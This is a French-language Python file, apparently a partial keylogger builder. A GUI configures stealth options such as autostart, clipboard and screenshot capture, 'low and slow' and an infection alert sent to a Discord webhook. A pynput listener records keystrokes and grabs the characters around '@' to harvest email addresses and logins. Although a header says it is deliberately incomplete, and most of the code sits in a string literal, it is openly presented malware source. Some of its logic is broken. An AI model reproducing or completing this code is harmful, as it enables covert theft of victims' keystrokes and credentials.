###################################################################################
###################################################################################

#Le keylog marche d'une maniere spécifique, je l'ai pas mis en entier ici exprès
#Vous ne pourrez pas l'utiliser

###################################################################################
###################################################################################





























from pynput import keyboard
import sys
import time
import customtkinter as ctk
from tkinter import messagebox
import requests
import json
import os
import time
from datetime import datetime

"""
historique = []
capture_apres_at = False
apres_at_buffer = []
compteur = 0



ctk.set_appearance_mode("Dark")
ctk.set_default_color_theme("dark-blue")

def valider_webhook():
    if webhook_entry.get() == "":
        messagebox.showerror("Erreur", "Le champ du webhook ne peut pas être vide.")


# Option heure d'activité



def activity_time_option_selected():
    if activity_time_option.get() == 1:
        messagebox.showinfo("Information", "L'option 'Heure d'activité' a été sélectionnée.")
        heure = ctk.CTkToplevel(app)
        heure.geometry("400x300")
        heure.title("Configuration de l'heure d'activité")
        debut_label = ctk.CTkLabel(heure, text="Heure de début (HH:MM):", font=ctk.CTkFont(size=14))
        debut_label.pack(pady=10)
        debut_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        debut_entry.pack(pady=10)
        fin_label = ctk.CTkLabel(heure, text="Heure de fin (HH:MM):", font=ctk.CTkFont(size=14))
        fin_label.pack(pady=10)
        fin_entry = ctk.CTkEntry(heure, width=200, font=ctk.CTkFont(size=14))
        fin_entry.pack(pady=10)
        def valider_hour():
            heure_debut_valide = debut_entry.get()
            heure_fin_valide = fin_entry.get()
            if heure_debut_valide == "" or heure_fin_valide == "":
                messagebox.showerror("Erreur", "Les champs d'heure de début et de fin ne peuvent pas être vides.")
                time.sleep(2)
                heure.destroy()
            else:
                heure.destroy()
                return nom_keylogs()
        valider_heure_btn = ctk.CTkButton(heure, text="Valider", font=ctk.CTkFont(size=14), command=valider_hour)
        valider_heure_btn.pack(pady=20)

    if valider_heure_btn == True:
        heure_debut = 16
        heure_fin = 17
        while True:
            mtn = datetime.now()
            if heure_debut <= mtn.hour < heure_fin:
                messagebox.showinfo("Information", "Le keylogger est actif pendant l'heure d'activité.")
                time.sleep(5)
        
            else:
                messagebox.showinfo("Information", "Le keylogger est inactif en dehors de l'heure d'activité.")
                time.sleep(5)


        

# Option choix du nom du keylogs

def nom_keylogs():
    nom_window = ctk.CTkToplevel(app)
    nom_window.geometry("400x200")
    nom_window.title("Choix du nom du keylogs")
    nom_label = ctk.CTkLabel(nom_window, text="Entrez le nom du fichier keylogs :", font=ctk.CTkFont(size=14))
    nom_label.pack(pady=10)
    nom_entry = ctk.CTkEntry(nom_window, width=200, font=ctk.CTkFont(size=14))
    nom_entry.pack(pady=10)
    def valider():
        nom = nom_entry.get()
        if nom == "":
            messagebox.showerror("Erreur", "Le champ du nom du fichier keylogs ne peut pas être vide.")
            time.sleep(2)
            nom_window.destroy()
        else:
            nom_window.destroy()
    valider_nom_btn = ctk.CTkButton(nom_window, text="Valider", font=ctk.CTkFont(size=14), command=valider)
    valider_nom_btn.pack(pady=20)
    

# Options supplémentaires

def screenshot_option_func():
    messagebox.showinfo("Information", "L'option 'Capture d'écran' a été sélectionnée.")
    #if screenshot_option.get() == 1:

def clipboard_option_func():
    messagebox.showinfo("Information", "L'option 'Capture du presse-papier' a été sélectionnée.")

def autostart_option_func():
    messagebox.showinfo("Information", "L'option 'Démarrage automatique' a été sélectionnée.")

def capture_before_after_at_option_func():
    messagebox.showinfo("Information", "L'option 'Capture avant @ et après' a été sélectionnée.")

def low_and_slow_option_func():
    messagebox.showinfo("Information", "L'option 'Low and Slow' a été sélectionnée.")

def alert_on_infection_option_func():
    if alert_on_infection_option.get() == 1:
        messagebox.showinfo("Information", "L'option 'Alerte si contamination' a été sélectionnée.")
    
        discord_webhook = webhook_entry.get()
        if discord_webhook == "":
            messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour cette option.")
            return
        
        message = {"content": "Alerte : Une contamination a été détectée sur le système infecté."}

        envoyer = requests.post(discord_webhook, json=message)
        if envoyer.status_code == 204:
            messagebox.showinfo("Succès", "Alerte envoyée avec succès au webhook Discord.")
        else:
            messagebox.showerror("Erreur", f"Échec de l'envoi de l'alerte. Code d'erreur : {envoyer.status_code}")

# Test du webhook Discord

def test_webhook():
    test = webhook_entry.get()
    if test == "":
        messagebox.showerror("Erreur", "Le webhook Discord ne peut pas être vide pour ce test.")
        return
    
    message = {"content": "Ceci est un message de test pour vérifier le webhook Discord."}

    envoyer = requests.post(test, json=message)
    if envoyer.status_code == 204:
        messagebox.showinfo("Succès", "Le webhook Discord fonctionne correctement.")
    else:
        messagebox.showerror("Erreur", f"Le webhook Discord a échoué avec le code d'erreur : {envoyer.status_code}")


# Sauvegarde la configuration dans un fichier JSON

CONFIG_FILE = "keylogger_config.json"

def lancer_programme():
    """Sauvegarde la configuration choisie dans un fichier JSON."""
    config = {
        "webhook": webhook_entry.get(),
        "options": {
            "choix_nom": choix_nom.get(),
            "screenshot": screenshot_option.get(),
            "clipboard": clipboard_option.get(),
            "autostart": autostart_option.get(),
            "activity_time": activity_time_option.get(),
            "capture_before_after_at": capture_before_after_at_option.get(),
            "low_and_slow": low_and_slow_option.get(),
            "alert_on_infection": alert_on_infection_option.get()
        }
    }

    # Vérification minimale
    if config["webhook"] == "":
        messagebox.showerror("Erreur", "Veuillez entrer un webhook avant de continuer.")
        return

    # Écriture du fichier
    with open("keylogger_config.json", "w", encoding="utf-8") as f:
        json.dump(config, f, indent=4, ensure_ascii=False)

    with open("tuteur_demande.py", "w", encoding="utf-8") as f:
        f.write("# Fichier généré automatiquement avec les options sélectionnées\n\n")
        f.write(f"WEBHOOK = '{config['webhook']}'\n\n")
        f.write("OPTIONS = {\n")
        for option, valeur in config["options"].items():
            f.write(f"    '{option}': {valeur},\n")
        f.write("}\n")

    messagebox.showinfo("Succès", "✅ Configuration enregistrée dans 'keylogger_config.json'.")
    app.destroy()

        
# INTERFACE GRAPHIQUE

app = ctk.CTk()
app.geometry("900x700")
app.title("Configuration du Keylogger")

# TITRE

titre = ctk.CTkLabel(app, text="Configuration du Keylogger", font=ctk.CTkFont(size=20, weight="bold"))
titre.pack(pady=20)

# WEBHOOK DISCORD

instructions = ctk.CTkLabel(app, text="Entrez le nom du webhook Discord pour envoyer les logs capturés :", font=ctk.CTkFont(size=16))
instructions.pack(pady=10)
webhook_entry = ctk.CTkEntry(app, width=400, font=ctk.CTkFont(size=14), placeholder_text="https://discord.com/api/webhooks/...")
webhook_entry.pack(pady=10)
webhook_btn = ctk.CTkButton(app, text="Valider", font=ctk.CTkFont(size=14), command=valider_webhook)
webhook_btn.pack(pady=10)
test = ctk.CTkButton(app, text="Tester le webhook", font=ctk.CTkFont(size=14), command=test_webhook)
test.pack(pady=10)

# OPTIONS SUPPLÉMENTAIRES
# === Variables reliées aux cases à cocher ===
choix_nom_var = ctk.BooleanVar(value=False)
screenshot_var = ctk.BooleanVar(value=False)
clipboard_var = ctk.BooleanVar(value=False)
autostart_var = ctk.BooleanVar(value=False)
activity_time_var = ctk.BooleanVar(value=False)
capture_var = ctk.BooleanVar(value=False)
low_slow_var = ctk.BooleanVar(value=False)
alert_var = ctk.BooleanVar(value=False)

# === Cases à cocher reliées aux variables ===
choix_nom = ctk.CTkCheckBox(app, text="Choix du nom du keylogs", variable=choix_nom_var, command=nom_keylogs)
choix_nom.pack(pady=5)

screenshot_option = ctk.CTkCheckBox(app, text="Capture d'écran", variable=screenshot_var)
screenshot_option.pack(pady=5)

clipboard_option = ctk.CTkCheckBox(app, text="Capture du presse-papier", variable=clipboard_var)
clipboard_option.pack(pady=5)

autostart_option = ctk.CTkCheckBox(app, text="Démarrage automatique", variable=autostart_var)
autostart_option.pack(pady=5)

activity_time_option = ctk.CTkCheckBox(app, text="Heure d'activité", variable=activity_time_var, command=activity_time_option_selected)
activity_time_option.pack(pady=5)

capture_before_after_at_option = ctk.CTkCheckBox(app, text="Capture avant @ et après", variable=capture_var)
capture_before_after_at_option.pack(pady=5)

low_and_slow_option = ctk.CTkCheckBox(app, text="Low and Slow", variable=low_slow_var)
low_and_slow_option.pack(pady=5)

alert_on_infection_option = ctk.CTkCheckBox(app, text="Alerte si contamination", variable=alert_var, command=alert_on_infection_option_func)
alert_on_infection_option.pack(pady=5)


# BOUTON LANCER LE PROGRAMME
lancer_btn = ctk.CTkButton(app, text="Lancer le programme", font=ctk.CTkFont(size=16, weight="bold"), command=lancer_programme)
lancer_btn.pack(pady=20)




app.mainloop()

















def touche(key):
    global historique, capture_apres_at, apres_at_buffer, compteur

    try:
        caractere = key.char
        historique.append(caractere)

          # Si on est en phase de capture après le @
        if capture_apres_at:
            apres_at_buffer.append(caractere)
            compteur += 1

            if compteur >= 20:
                print("\n--- 20 caractères après @ ---")
                print(''.join(apres_at_buffer))
                print("--------------------------------\n")
                # Réinitialisation
                capture_apres_at = False
                apres_at_buffer = []
                compteur = 0

    except AttributeError:
        print(f"Special key {key} pressed")

        # Si la touche est @
    if hasattr(key, 'char') and key.char == '@':
        print("\n--- 16 caractères avant @ ---")
        print(''.join(historique[-30:]))  # les 30 derniers AVANT @
        print("--------------------------------")

            # Activer la capture des 20 caractères suivants
        capture_apres_at = True
        apres_at_buffer = []
        compteur = 0

    # Lancement du listener
with keyboard.Listener(on_press=touche) as listener:
    listener.join()

"""
